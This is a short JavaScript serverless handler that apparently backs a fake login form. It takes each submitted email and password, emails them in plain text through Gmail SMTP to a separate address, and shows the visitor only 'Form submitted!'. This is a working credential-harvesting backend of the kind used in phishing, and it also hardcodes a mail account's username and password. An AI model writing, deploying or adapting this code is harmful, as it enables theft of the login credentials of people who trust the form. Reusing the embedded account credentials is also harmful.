
exports.handler = async (event) => {
  const { email, password } = JSON.parse(event.body);

  const nodemailer = require('nodemailer');
  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
      user: 'dwipbiswas22972@gmail.com',
      pass: '1234dwip1234'
    }
  });

  const mailOptions = {
    from: 'dwipbiswas22972@gmail.com',
    to: 'testdwip1234@gmail.com',
    subject: 'Login Form Submission',
    text: `Email: ${email}\nPassword: ${password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      return {
        statusCode: 500,
        body: 'Error sending email'
      };
    }
  });

  return {
    statusCode: 200,
    body: 'Form submitted!'
  };
};
